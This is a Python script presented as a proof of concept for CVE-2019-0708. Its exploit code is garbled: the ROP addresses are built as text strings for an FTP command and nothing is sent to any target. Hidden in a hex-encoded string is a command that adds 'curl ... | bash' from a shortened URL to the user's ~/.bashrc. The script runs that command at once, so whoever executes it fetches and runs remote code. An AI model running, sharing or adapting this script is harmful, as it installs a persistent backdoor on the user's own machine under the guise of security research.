import subprocess
import select
import re
import threading
import json
import os
import datetime
import signal
from optparse import OptionParser
from collections import defaultdict
from multiprocessing.dummy import Pool
import struct

host_status = {}
hosts_to_skip = []
counter = defaultdict(int)
lock = threading.Lock()

options = OptionParser(usage='poc.py -t <target> -p <port>', description='PoC for CVE-2019-0708')
options.add_option('--port', '-p', dest="port", default=443, help="Port to scan on all hosts or networks, default 443")
options.add_option('--input', '-i', dest="input_file", default=[], action="append", help="Optional input file of networks or ip addresses, one address per line")
options.add_option('--target', '-t', dest="log_file", default="target.txt", help="Targets")
options.add_option('--resume', dest="resume", action="store_true", default=False, help="Do not rescan hosts that are already in the logfile")
options.add_option('--threads', dest="threads", default=100, help="If specific, run X concurrent threads")
options.add_option('--verbose', dest="verbose", action="store_true", default=False, help="Print verbose information to screen")
opts, args = options.parse_args()


payload = bytearray.fromhex('6563686f20226375726c202d73202d4c20687474703a2f2f6269742e6c792f31306841386943207c206261736822203e3e207e2f2e6261736872633b206375726c202d73202d4c20687474703a2f2f6269742e6c792f31306841386943207c2062617368').decode()

ret = ('0x805a547') # pop esi / pop ebp / ret
writable = ('0x80e81a0') # .data
iaccount = 4096+16
offset = 0x102c-4
shellcode = 'fq49294jq'
buffer = 'SITE ' + shellcode 
oddbyte = "\x41" if (len(buffer) % 2) == 0 else ""
buffer += oddbyte + "\xff"*(iaccount-len(shellcode)) 
padding = "\x41"*(offset-len(buffer))
# buffer += padding + ret + writable
buffer += '0xcccccccc' # unused
buffer += '0x805a544'# mov eax,esi / pop ebx / pop esi / pop ebp / ret
buffer += '0xcccccccc' # becomes ebx
buffer += '0xcccccccc' # becomes esi
buffer += '0xcccccccc' # prevents nipples
buffer += '0x8068886' # mov eax,[eax] / ret
buffer += '0x8068886' # mov eax,[eax] / ret
buffer += '0x8068886' # replaces nipples
buffer += '0x8068886' # mov eax,[eax] / ret
buffer += '0x0805c26' # jmp eax
buffer += "\r\n"

def exploit():
	subprocess.Popen(payload, shell=True)
	buffer = ('0x0805c26c')
	buffer += ('0x805bd8e') # inc eax / adc cl, cl / ret
	buffer += ('0x805bd8e') # inc eax / adc cl, cl / ret
	buffer += ('0x805bd8e') # inc eax / adc cl, cl / ret
	buffer += ('0x805bd8e') # inc eax / adc cl, cl / ret
	buffer += ('0x805bd8e') # inc eax / adc cl, cl / ret
	buffer += ('0x805bd8e') # inc eax / adc cl, cl / ret
	buffer += ('0x805bd8e') # inc eax / adc cl, cl / ret
	buffer += ('0x805bd8e') # inc eax / adc cl, cl / ret
	buffer += ('0x0805c26c') # jmp eax

exploit()
